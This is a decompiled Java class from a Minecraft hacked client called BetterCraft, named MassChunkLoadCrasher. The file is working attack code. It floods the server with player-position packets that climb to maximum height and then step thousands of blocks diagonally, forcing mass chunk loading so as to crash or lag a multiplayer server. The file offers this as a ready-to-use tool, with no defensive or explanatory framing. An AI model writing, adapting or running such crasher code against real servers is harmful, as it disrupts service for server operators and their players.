/*    */ package me.nzxter.bettercraft.mods.crasher;
/*    */ 
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketPlayer;
/*    */ 
/*    */ public class MassChunkLoadCrasher {
/*    */   public static void start() {
/*  9 */     for (double i2 = (Minecraft.getMinecraft()).player.posY; i2 < 255.0D; i2 += 5.0D) {
/* 10 */       (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketPlayer.Position((Minecraft.getMinecraft()).player.posX, i2, (Minecraft.getMinecraft()).player.posZ, true));
/*    */     }
/* 12 */     for (int i3 = 0; i3 < 6685; i3 += 5)
/* 13 */       (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketPlayer.Position((Minecraft.getMinecraft()).player.posX + i3, 255.0D, (Minecraft.getMinecraft()).player.posZ + i3, true)); 
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\MassChunkLoadCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */